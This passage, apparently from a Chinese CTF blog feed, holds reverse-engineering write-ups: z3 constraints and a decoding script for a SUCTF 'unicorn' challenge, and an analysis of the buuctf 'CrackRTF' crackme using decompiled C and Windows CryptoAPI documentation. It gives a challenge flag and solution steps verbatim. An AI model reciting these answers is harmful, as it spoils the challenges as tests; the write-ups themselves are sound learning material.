c[0x1b]) + c[                                  0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21]) - c[0x22]) - c[0x23]) - c[                             0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[10] == ((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) + c[6] + c[7]) - c[    8]) - c[9]) - c[10]) - c[0xb]) + c[0xc] + c[0xd] + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] + c[                                             0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a]) -                                  c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) +                           c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0xb] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[8]) +                                                c[9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[                                              0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14]) - c[0x15]) + c[0x16]) -                                    c[0x17]) + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e]) -                                c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) + c[0x24] + c[0x25]) - c[0x26]) -                         c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0xc] == (((((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4]) - c[5]) - c[6]) + c[    7] + c[8]) - c[9]) + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12]) - c[                                               0x13]) - c[0x14]) - c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) + c[                                         0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[                                  0x20] + c[0x21] + c[0x22]) - c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) + c[0x27]) - c[                            0x28]) - c[0x29])solver.add(enc[0xd] == (((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) + c[4]) - c[5]) + c[6]) - c[7]) +                                                 c[8]) - c[9]) + c[10]) - c[0xb]) + c[0xc] + c[0xd] + c[0xe] + c[0xf]) -                                            c[0x10]) - c[0x11]) - c[0x12]) + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) -                                       c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) + c[0x1c] + c[0x1d]) - c[                                      0x1e]) - c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) - c[0x23]) + c[0x24]) - c[                               0x25]) - c[0x26]) - c[0x27]) + c[0x28]) - c[0x29])solver.add(enc[0xe] == (((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) - c[4]) - c[5]) + c[6]) - c[7]) + c[8] + c[    9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) - c[0x13]) - c[0x14]) -                                 c[0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) + c[0x1a] + c[0x1b] + c[0x1c]) - c[                                 0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21] + c[0x22] + c[0x23] + c[0x24] + c[                              0x25] + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0xf] == ((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4] + c[5]) - c[6]) + c[7]) - c[8]) - c[    9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) - c[                                       0x14]) - c[0x15]) + c[0x16] + c[0x17] + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) -                                c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) + c[0x22] + c[0x23] + c[                              0x24] + c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x10] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) + c[6] + c[7] + c[8] +                                                  c[9] + c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[                                                  0x10]) - c[0x11]) + c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) - c[                                            0x16]) - c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[0x1b] + c[0x1c] + c[                                        0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) - c[0x22]) + c[0x23]) - c[                                 0x24]) + c[0x25]) - c[0x26]) + c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x11] == ((((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7] + c[    8]) - c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe] + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) +                                            c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) + c[0x19]) - c[0x1a]) +                                     c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) + c[0x20]) - c[0x21]) - c[                                  0x22]) + c[0x23]) - c[0x24]) + c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x12] == ((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5]) - c[6]) + c[7]) -                                                    c[8]) + c[9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[                                                  0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[0x14]) - c[                                              0x15]) - c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) +                                   c[0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) -                             c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x13] == ((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) - c[5]) + c[6]) - c[7]) - c[8]) -                                            c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10]) -                                      c[0x11]) + c[0x12] + c[0x13] + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[                                       0x18]) - c[0x19]) + c[0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f] +                               c[0x20] + c[0x21]) - c[0x22]) + c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) + c[0x27] + c[                             0x28]) - c[0x29])solver.add(enc[0x14] == ((((((((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5]) - c[6]) + c[    7]) - c[8]) - c[9]) + c[10] + c[0xb]) - c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[                                               0x13]) + c[0x14] + c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) -                                      c[0x1a]) - c[0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) + c[                                   0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28]) -           c[0x29])solver.add(enc[0x15] == (((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5] + c[6] + c[7]) -                                                       c[8]) - c[9]) - c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) -                                                c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[                                              0x15]) + c[0x16] + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b]) -                                     c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[                                  0x23]) - c[0x24]) + c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x16] == (((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6] + c[7]) - c[8]) + c[    9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe] + c[0xf]) - c[0x10]) + c[0x11] + c[0x12]) - c[0x13]) - c[0x14]) +                                        c[0x15] + c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b]) - c[                                      0x1c]) + c[0x1d] + c[0x1e] + c[0x1f]) - c[0x20]) + c[0x21]) - c[0x22]) - c[                                 0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0x17] == (((((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) - c[5]) - c[6]) - c[7]) +                                                     c[8]) - c[9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) - c[0xe]) + c[                                                   0xf]) - c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) - c[0x14]) - c[                                              0x15]) + c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b]) -                                    c[0x1c]) + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[                                  0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x18] == (((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[8]) + c[    9] + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11]) - c[0x12]) + c[0x13] + c[0x14] +                                    c[0x15] + c[0x16] + c[0x17] + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) +                                c[0x1d] + c[0x1e]) - c[0x1f]) + c[0x20] + c[0x21] + c[0x22]) - c[0x23]) - c[0x24]) - c[                               0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x19] == ((((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5] + c[6]) - c[7]) + c[    8] + c[9] + c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[                                               0x14]) - c[0x15]) + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a]) -                                     c[0x1b]) + c[0x1c]) - c[0x1d]) + c[0x1e]) - c[0x1f]) - c[0x20]) + c[0x21]) - c[                                  0x22]) - c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) + c[0x28] + c[0x29])solver.add(enc[0x1a] == (((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4]) - c[5]) - c[6]) + c[7]) - c[8]) -                                                c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe]) - c[0xf]) + c[                                             0x10]) - c[0x11]) + c[0x12]) - c[0x13]) - c[0x14]) + c[0x15] + c[0x16] + c[                                        0x17] + c[0x18] + c[0x19]) - c[0x1a]) - c[0x1b]) - c[0x1c]) - c[0x1d]) + c[                                   0x1e] + c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) -                         c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1b] == (((((((((((((((((((((((((((((((c[0] - c[1]) + c[2]) - c[3]) + c[4]) - c[5]) - c[6]) - c[7]) - c[    8]) - c[9]) - c[10]) - c[0xb]) + c[0xc] + c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13]) - c[                                             0x14]) - c[0x15]) - c[0x16]) - c[0x17]) + c[0x18] + c[0x19] + c[0x1a]) - c[                                        0x1b]) + c[0x1c] + c[0x1d] + c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[                                   0x22]) + c[0x23]) - c[0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x1c] == ((((((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) + c[6] + c[7]) - c[    8]) - c[9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11] + c[0x12] + c[0x13]) - c[                                             0x14]) - c[0x15]) + c[0x16]) - c[0x17]) - c[0x18]) - c[0x19]) - c[0x1a]) +                                  c[0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) + c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22] +                           c[0x23] + c[0x24]) - c[0x25]) - c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1d] == ((((((((((((((((((((((((((c[0] + c[1]) - c[2]) - c[3]) - c[4]) + c[5] + c[6] + c[7]) - c[8]) +                                            c[9]) - c[10]) - c[0xb]) + c[0xc]) - c[0xd]) + c[0xe] + c[0xf]) - c[0x10]) +                                     c[0x11] + c[0x12]) - c[0x13]) + c[0x14] + c[0x15] + c[0x16] + c[0x17]) - c[0x18]) +                                 c[0x19] + c[0x1a]) - c[0x1b]) + c[0x1c] + c[0x1d] + c[0x1e] + c[0x1f] + c[0x20]) - c[                                  0x21]) - c[0x22]) + c[0x23] + c[0x24]) - c[0x25]) + c[0x26] + c[0x27]) - c[0x28]) + c[               0x29])solver.add(enc[0x1e] == ((((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) - c[5]) - c[6]) - c[7]) + c[    8] + c[9]) - c[10]) - c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) - c[0x12]) - c[0x13]) +                                        c[0x14]) - c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[                                      0x1b]) - c[0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[                               0x22]) + c[0x23] + c[0x24] + c[0x25]) - c[0x26]) + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x1f] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3] + c[4]) - c[5]) - c[6]) + c[7] + c[    8] + c[9] + c[10] + c[0xb] + c[0xc]) - c[0xd]) - c[0xe]) - c[0xf]) + c[0x10] + c[0x11] + c[0x12] + c[0x13]) - c[                                                0x14]) + c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) - c[0x19]) + c[                                          0x1a] + c[0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) + c[                                    0x21]) - c[0x22]) + c[0x23]) - c[0x24]) + c[0x25]) - c[0x26]) + c[0x27]) - c[                             0x28]) - c[0x29])solver.add(enc[0x20] == (((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3]) - c[4]) + c[5] + c[6] + c[7] + c[8]) - c[    9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd] + c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13] + c[0x14]) -                                       c[0x15]) - c[0x16]) + c[0x17]) - c[0x18]) + c[0x19] + c[0x1a] + c[0x1b]) - c[                                      0x1c]) - c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22] + c[                                0x23] + c[0x24] + c[0x25]) - c[0x26]) + c[0x27]) - c[0x28]) + c[0x29])solver.add(enc[0x21] == (((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3] + c[4] + c[5] + c[6]) - c[7]) - c[    8]) + c[9] + c[10] + c[0xb]) - c[0xc]) - c[0xd]) + c[0xe] + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) + c[0x13]) - c[                                              0x14]) + c[0x15] + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[                                          0x1b]) - c[0x1c]) + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[                                   0x22]) - c[0x23]) + c[0x24]) - c[0x25]) + c[0x26]) - c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x22] == ((((((((((((((((((((((((((((((c[0] + c[1]) - c[2]) + c[3]) - c[4]) - c[5]) - c[6]) + c[7] + c[    8] + c[9] + c[10] + c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf]) - c[0x10]) + c[0x11]) - c[0x12]) + c[0x13]) - c[                                           0x14]) - c[0x15]) + c[0x16] + c[0x17]) - c[0x18]) - c[0x19]) + c[0x1a] + c[                                      0x1b] + c[0x1c] + c[0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[                                 0x22]) - c[0x23]) - c[0x24]) + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x23] == ((((((((((((((((((((((((((c[0] - c[1]) + c[2] + c[3] + c[4]) - c[5]) - c[6]) + c[7] + c[8]) - c[    9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) + c[0x10]) - c[0x11]) + c[0x12] + c[0x13]) - c[0x14]) -                                    c[0x15]) - c[0x16]) + c[0x17] + c[0x18]) - c[0x19]) - c[0x1a]) + c[0x1b] + c[                                   0x1c]) - c[0x1d]) - c[0x1e]) + c[0x1f] + c[0x20]) - c[0x21]) + c[0x22] + c[0x23] + c[                              0x24] + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x24] == (((((((((((((((((((((((((c[0] + c[1] + c[2]) - c[3]) - c[4]) - c[5]) - c[6]) + c[7] + c[8] + c[    9]) - c[10]) + c[0xb] + c[0xc]) - c[0xd]) + c[0xe] + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[                                            0x15]) - c[0x16]) - c[0x17]) + c[0x18]) - c[0x19]) - c[0x1a]) - c[0x1b]) -                                 c[0x1c]) + c[0x1d] + c[0x1e] + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) - c[                                0x24]) + c[0x25]) - c[0x26]) + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x25] == ((((((((((((((((((((((((((((((((((((((c[0] - c[1]) - c[2]) + c[3]) - c[4]) + c[5]) - c[6]) - c[    7]) - c[8]) - c[9]) + c[10]) - c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) + c[0x11] + c[0x12]) - c[                                                 0x13]) - c[0x14]) - c[0x15]) + c[0x16]) - c[0x17]) + c[0x18]) - c[                                           0x19]) - c[0x1a]) + c[0x1b]) - c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f]) - c[                                     0x20]) + c[0x21]) - c[0x22]) + c[0x23]) - c[0x24]) - c[0x25]) + c[0x26]) - c[                              0x27]) - c[0x28]) - c[0x29])solver.add(enc[0x26] == ((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3]) - c[4]) + c[5] + c[6] + c[7]) - c[8]) - c[    9]) - c[10]) + c[0xb] + c[0xc] + c[0xd]) - c[0xe]) - c[0xf]) - c[0x10]) - c[0x11]) - c[0x12]) - c[0x13]) + c[0x14] +                                     c[0x15]) - c[0x16]) + c[0x17] + c[0x18] + c[0x19] + c[0x1a] + c[0x1b]) - c[0x1c]) -                                 c[0x1d]) + c[0x1e] + c[0x1f]) - c[0x20]) - c[0x21]) + c[0x22]) - c[0x23]) - c[0x24]) -                          c[0x25]) + c[0x26] + c[0x27] + c[0x28]) - c[0x29])solver.add(enc[0x27] == (((((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) - c[4]) + c[5]) - c[6]) - c[7]) - c[8]) +                                         c[9]) - c[10]) + c[0xb]) - c[0xc]) + c[0xd] + c[0xe]) - c[0xf]) - c[0x10]) - c[                                      0x11]) + c[0x12] + c[0x13] + c[0x14] + c[0x15] + c[0x16]) - c[0x17]) + c[0x18] +                               c[0x19] + c[0x1a] + c[0x1b] + c[0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20] + c[                                 0x21] + c[0x22]) - c[0x23]) - c[0x24]) + c[0x25] + c[0x26] + c[0x27]) - c[0x28]) + c[               0x29])solver.add(enc[0x28] == ((((((((((((((((((((((c[0] - c[1]) - c[2]) - c[3]) + c[4] + c[5] + c[6]) - c[7]) + c[8] + c[    9]) - c[10]) + c[0xb]) - c[0xc]) - c[0xd]) - c[0xe]) + c[0xf] + c[0x10] + c[0x11] + c[0x12] + c[0x13] + c[0x14] + c[                                       0x15] + c[0x16]) - c[0x17]) + c[0x18] + c[0x19]) - c[0x1a]) + c[0x1b] + c[                                   0x1c]) - c[0x1d]) + c[0x1e] + c[0x1f] + c[0x20]) - c[0x21]) - c[0x22]) + c[0x23] + c[                              0x24]) - c[0x25]) + c[0x26] + c[0x27] + c[0x28] + c[0x29])solver.add(enc[0x29] == (((((((((((((((((((((((((((((((c[0] + c[1] + c[2] + c[3] + c[4] + c[5] + c[6]) - c[7]) - c[8]) -                                                    c[9]) + c[10] + c[0xb]) - c[0xc]) + c[0xd]) - c[0xe]) - c[0xf]) - c[                                                  0x10]) - c[0x11]) - c[0x12]) - c[0x13]) + c[0x14]) - c[0x15]) + c[                                            0x16]) - c[0x17]) - c[0x18]) + c[0x19] + c[0x1a] + c[0x1b] + c[0x1c]) - c[                                        0x1d]) - c[0x1e]) - c[0x1f]) - c[0x20]) - c[0x21]) - c[0x22]) - c[0x23]) - c[                                 0x24]) - c[0x25]) - c[0x26]) - c[0x27]) - c[0x28]) + c[0x29])</code></pre><p>这一部分可以直接用脚本来写，把所有的<code>param_1</code>替换并且注意把<code>（uint)</code>和<code>*param_1</code>特殊处理一下就好了</p><p>然后解出为唯一解</p><pre><code class="python">if solver.check() == sat:    r = solver.model()    for i in range(42):        flag.append(r[c[i]].as_long() ^ i)    flag = &#39;&#39;.join(map(lambda x: chr(((x &gt;&gt; 3) | (x &lt;&lt; 5)) &amp; 0xff), flag))    print flag</code></pre><p>直接输出flag</p><pre><code>SUCTF{Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!}</code></pre><p><code>unicorn</code>和<code>z3</code>实在是太好用了，之前<code>b01lersCTF</code>的第一道题我还愚蠢的手解方程，早知道<code>z3</code>一把梭就完了……</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>攻防世界</tag>
      
      <tag>unicorn</tag>
      
      <tag>z3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CrackRTF-buuctf</title>
    <link href="/2020/03/27/CrackRTF-buuctf/"/>
    <url>/2020/03/27/CrackRTF-buuctf/</url>
    
    <content type="html"><![CDATA[<p>这一题用到了一些windows加密算法中的东西</p><a id="more"></a><p>根据字符串找到了关键的部分函数</p><pre><code class="c++">void FUN_00401690(void){  size_t sVar1;  uint uVar2;  int iVar3;  undefined4 *puVar4;  char *pcVar5;  undefined4 local_354 [16];  BYTE local_314 [260];  int local_210;  char local_20c [260];  byte local_108 [256];  undefined4 uStack8;  iVar3 = 0xd4;  puVar4 = local_354;  while (iVar3 != 0) {    iVar3 = iVar3 + -1;    *puVar4 = 0xcccccccc;    puVar4 = puVar4 + 1;  }  _memset(local_108,0,0x104);  _memset(local_20c,0,0x104);  local_210 = 0;  FUN_00401e60((byte *)&quot;pls input the first passwd(1): &quot;);  FUN_00401e00(&amp;DAT_00426104);  sVar1 = _strlen((char *)local_108);  if (sVar1 != 6) {    FUN_00401e60((byte *)&quot;Must be 6 characters!\n&quot;);    ExitProcess(0);    __chkesp();  }  local_210 = FUN_00401c30(local_108);  if (local_210 &lt; 100000) {    ExitProcess(0);    __chkesp();  }  FID_conflict:_strcat((char *)local_108,&quot;@DBApp&quot;);  pcVar5 = local_20c;  sVar1 = _strlen((char *)local_108);  thunk_FUN_00401230(local_108,sVar1,pcVar5);  iVar3 = __strcmpi(local_20c,&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;);  if (iVar3 == 0) {    FUN_00401e60((byte *)&quot;continue...\n\n&quot;);    FUN_00401e60((byte *)&quot;pls input the first passwd(2): &quot;);    _memset(local_314,0,0x104);    FUN_00401e00(&amp;DAT_00426104);    sVar1 = _strlen((char *)local_314);    if (sVar1 != 6) {      FUN_00401e60((byte *)&quot;Must be 6 characters!\n&quot;);      ExitProcess(0);      __chkesp();    }    FID_conflict:_strcat((char *)local_314,(char *)local_108);    _memset(local_20c,0,0x104);    pcVar5 = local_20c;    sVar1 = _strlen((char *)local_314);    thunk_FUN_00401040(local_314,sVar1,pcVar5);    iVar3 = __strcmpi(&quot;27019e688a4e62a649fd99cadaafdb4e&quot;,local_20c);    if (iVar3 == 0) {      uVar2 = thunk_FUN_004014d0((LPCSTR)local_314);      if ((uVar2 &amp; 0xff) == 0) {        FUN_00401e60((byte *)&quot;Error!!\n&quot;);        ExitProcess(0);        __chkesp();      }      else {        FUN_00401e60((byte *)&quot;bye ~~\n&quot;);      }    }  }  uStack8 = 0x4018f6;  __chkesp();  return;}</code></pre><p>需要pass两层密码才可以，仔细看一下加密的部分</p><pre><code class="c++">void __cdecl FUN_00401230(BYTE *param_1,DWORD param_2,LPSTR param_3){  int iVar1;  undefined4 *puVar2;  undefined4 local_6c [16];  uint local_2c;  CHAR local_28 [4];  byte local_24 [20];  DWORD local_10;  HCRYPTHASH local_c;  HCRYPTPROV local_8;  iVar1 = 0x1a;  puVar2 = local_6c;  while (iVar1 != 0) {    iVar1 = iVar1 + -1;    *puVar2 = 0xcccccccc;    puVar2 = puVar2 + 1;  }  CryptAcquireContextA(&amp;local_8,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);  iVar1 = __chkesp();  if (iVar1 != 0) {    CryptCreateHash(local_8,0x8004,0,0,&amp;local_c);    iVar1 = __chkesp();    if (iVar1 == 0) {      CryptReleaseContext(local_8,0);      __chkesp();    }    else {      CryptHashData(local_c,param_1,param_2,0);      iVar1 = __chkesp();      if (iVar1 == 0) {        CryptDestroyHash(local_c);        __chkesp();        CryptReleaseContext(local_8,0);        __chkesp();      }      else {        CryptGetHashParam(local_c,2,local_24,&amp;local_10,0);        __chkesp();        *param_3 = &#39;\0&#39;;        local_2c = 0;        while (local_2c &lt; local_10) {          wsprintfA(local_28,&quot;%02X&quot;,(uint)local_24[local_2c]);          __chkesp();          lstrcatA(param_3,local_28);          __chkesp();          local_2c = local_2c + 1;        }        CryptDestroyHash(local_c);        __chkesp();        CryptReleaseContext(local_8,0);        __chkesp();      }    }  }  local_8 = 0x4013b8;  __chkesp();  return;}</code></pre><p>第一层加密，重点看看一个函数<code>CryptCreateHash(local_8,0x8004,0,0,&amp;local_c)</code></p><p>上微软查查定义</p><pre><code class="c++">BOOL CryptCreateHash(  HCRYPTPROV hProv,  ALG_ID     Algid,  HCRYPTKEY  hKey,  DWORD      dwFlags,  HCRYPTHASH *phHash);</code></pre><p><code>hProv</code><br>A handle to a CSP created by a call to <a href="https://docs.microsoft.com/windows/desktop/api/wincrypt/nf-wincrypt-cryptacquirecontexta" target="_blank" rel="noopener">CryptAcquireContext</a>.</p><p><code>Algid</code><br>An <a href="https://docs.microsoft.com/windows/desktop/SecCrypto/alg-id" target="_blank" rel="noopener">ALG_ID</a> value that identifies the hash algorithm to use.</p><p>Valid values for this parameter vary, depending on the CSP that is used. For a list of default algorithms, see Remarks.</p><p><code>hKey</code><br>If the type of hash algorithm is a keyed hash, such as the <a href="https://docs.microsoft.com/windows/desktop/SecGloss/h-gly" target="_blank" rel="noopener">Hash-Based Message Authentication Code</a> (HMAC) or <a href="https://docs.microsoft.com/windows/desktop/SecGloss/m-gly" target="_blank" rel="noopener">Message Authentication Code</a> (MAC) algorithm, the key for the hash is passed in this parameter. For nonkeyed algorithms, this parameter must be set to zero.</p><p>For keyed algorithms, the key must be to a <a href="https://docs.microsoft.com/windows/desktop/SecGloss/b-gly" target="_blank" rel="noopener">block cipher</a> key, such as RC2, that has a <a href="https://docs.microsoft.com/windows/desktop/SecGloss/c-gly" target="_blank" rel="noopener">cipher mode</a> of <a href="https://docs.microsoft.com/windows/desktop/SecGloss/c-gly" target="_blank" rel="noopener">Cipher Block Chaining</a> (CBC).</p><p><code>dwFlags</code><br>The following flag value is defined.</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>CRYPT_SECRETDIGEST</strong>0x00000001</td><td align="left">This flag is not used.</td></tr></tbody></table><p><code>phHash</code><br>The address to which the function copies a handle to the new hash object. When you have finished using the hash object, release the handle by calling the <a href="https://docs.microsoft.com/windows/desktop/api/wincrypt/nf-wincrypt-cryptdestroyhash" target="_blank" rel="noopener">CryptDestroyHash</a> function.</p><p>需要关注<code>Algid</code>，定义了加密的方式，在 <a href="https://docs.microsoft.com/windows/desktop/SecCrypto/alg-id" target="_blank" rel="noopener">ALG_ID</a> 查一下<code>0x8004</code></p><table><thead><tr><th 